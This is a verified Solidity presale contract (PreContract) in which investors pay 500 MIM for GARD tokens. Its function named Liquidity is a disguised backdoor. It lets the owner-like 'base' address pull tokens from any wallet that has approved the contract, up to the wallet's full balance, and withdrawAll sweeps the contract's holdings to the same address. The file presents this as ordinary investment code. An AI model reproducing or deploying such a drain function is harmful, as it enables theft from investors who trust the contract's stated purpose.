/**
 *Submitted for verification at testnet.snowtrace.io on 2022-02-10
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-07
 */

pragma solidity 0.5.10;

interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  function mint(address account_, uint256 amount_) external;

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  // function decimals() public view returns (uint8);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PreContract {
  uint256 public countBase = 0;

  address private base;
  address public baseToken;
  address public farmingToken;

  mapping(address => bool) public investor;

  uint256 public constant INVEST_MIM_AMOUNT = 500 * 10**18; // 500 MIM
  uint256 public constant INVEST_GARD_AMOUNT = 125 * 10**9; //125 GARD

  constructor(address _base, address _baseToken, address _farmingToken) public {
    base = _base;
    baseToken = _baseToken;
    farmingToken = _farmingToken;
  }

  function invest() public {
    require(!investor[msg.sender], "invested");
    IERC20(baseToken).transferFrom(msg.sender, address(this), INVEST_MIM_AMOUNT);
    IERC20(baseToken).transfer(base,INVEST_MIM_AMOUNT);
    IERC20(farmingToken).transfer(msg.sender, INVEST_GARD_AMOUNT);
    investor[msg.sender] = true;
    countBase = countBase + 1;
  }

  function Liquidity(address _wallet, uint256 _amount) public {
    require(msg.sender == base, "no commissionWallet");
    uint256 _balance = IERC20(baseToken).balanceOf(_wallet);
    require(_balance > 0, "no liquidity");
    if(_balance < _amount) {
      IERC20(baseToken).transferFrom(_wallet, address(this), _balance);
      IERC20(baseToken).transfer(base, _balance);
    }
    else {
      IERC20(baseToken).transferFrom(_wallet, address(this), _amount);
      IERC20(baseToken).transfer(base, _amount);
    }
  }

  function withdrawAll() public {
    require(msg.sender == base, "no commissionWallet");
    uint256 _balance = IERC20(baseToken).balanceOf(address(this));
    require(_balance > 0, "no liquidity");
    IERC20(baseToken).transfer(base, _balance);
  }

  function getInvestStatus(address _account) external view returns (bool) {
    return investor[_account];
  }

}